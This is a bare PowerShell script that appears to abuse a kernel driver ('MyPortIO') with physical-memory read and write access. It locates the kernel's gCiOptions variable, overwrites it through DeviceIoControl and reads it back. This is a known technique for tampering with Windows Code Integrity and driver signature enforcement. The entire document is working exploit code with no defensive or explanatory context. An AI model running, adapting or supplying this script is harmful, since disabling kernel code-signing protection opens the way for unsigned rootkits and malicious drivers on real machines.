Clear-Host
Write-Host

$hDevice     = Get-FileHandle -FileName MyPortIO_x64 -AlternativeName MyPortIO0 -Symbolic 'Device'
$VA          = Get-gCiOptionsAddress
$PA          = Convert-VirtualToPhysical -VirtualAddress $VA

try {
    try {
        $newIntValue = 16390
        Write-Host
        Write-Host "Set new value: $newIntValue"

        $ByteToWrite = 4 # Cant write more than Int32 Size
        $InOutPtr    = New-IntPtr -Size 1024 -TypeSize ([Int64], [Int32], [Int32]) -Values ($PA, $ByteToWrite, $newIntValue)
        $RetBytes    = New-IntPtr -Size 8
        $hr          = $NtApi::DeviceIoControl($hDevice, (-1673484668), $InOutPtr, 16, $InOutPtr, 16, $RetBytes, [IntPtr]::Zero)
        Write-Host ("Results : {0}" -f ([Bool]$hr))
    } finally {
        Free-IntPtr $InOutPtr
        Free-IntPtr $RetBytes
    }

    try {
        $ByteToRead  = 4 # Cant read  more than Int32 Size
        $InOutPtr    = New-IntPtr -Size 1024 -TypeSize ([Int64], [Int32]) -Values ($PA, $ByteToRead)
        $RetBytes    = New-IntPtr -Size 8
        $hr          = $NtApi::DeviceIoControl($hDevice, (-1673501056), $InOutPtr, 12, $InOutPtr, 1024, $RetBytes, [IntPtr]::Zero)

        $Ret = [Marshal]::ReadInt32($RetBytes)
        if ($Ret -ge 0) {
            Write-Host
            Format-HexView -Address $InOutPtr -Size $Ret -Mode 16x
        }
    } finally {
        Free-IntPtr $InOutPtr
        Free-IntPtr $RetBytes
    }
} finally {
    Free-IntPtr $hDevice -Method NtHandle
}